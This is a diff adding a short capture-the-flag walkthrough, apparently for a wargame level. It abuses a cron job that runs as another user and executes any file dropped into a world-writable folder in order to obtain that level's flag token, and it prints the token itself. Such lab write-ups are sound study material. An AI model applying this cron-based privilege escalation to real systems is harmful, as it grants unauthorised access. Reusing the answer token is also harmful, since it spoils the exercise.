@@ -1,0 +1,21 @@
+# In /var/mail folder, you can find level05 file, lets use cat command on it
+# */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 ; this look like a crontab command
+# Let's check what openarenaserver does
+ cat /usr/sbin/openarenaserver
+ 	!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
+# This script execute everything that is contained in the path given to the for statement
+# Let's then make it execute our own script to execute getflag command, let's create it in the /tmp folder so we can chmod to have all needed rights to execute and modify
+ cd /tmp
+ mkdir ret
+ cd ret
+ touch script.sh
+ chmod 777 script.sh
+# script is : echo `getflag` > /tmp/ret/token
+# Then cp the script into /opt/openarenaserver/
+# Wait 2min for chron to start the script
+# Token is : viuaaale9huek52boumoomioc
